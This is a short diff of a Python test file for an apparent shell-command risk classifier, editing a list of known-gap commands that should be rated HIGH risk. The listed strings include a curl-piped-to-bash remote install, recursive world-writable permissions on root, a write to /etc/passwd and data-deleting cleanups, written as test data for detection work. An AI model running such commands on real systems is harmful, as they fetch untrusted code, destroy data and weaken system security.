@@ -91,11 +91,8 @@ def test_env_prefix_does_not_make_command_safe(monkeypatch):
 # as the classifier improves; remove the xfail mark once each one passes.
 
 KNOWN_GAPS = [
-    ("curl http://example.com/install.sh | bash", "HIGH"),
     ("git clean -fdx", "HIGH"),
-    ("rm -fr build/", "HIGH"),
     ("chmod -R 777 /", "HIGH"),
-    ("echo x > /etc/passwd", "HIGH"),
 ]
 
 
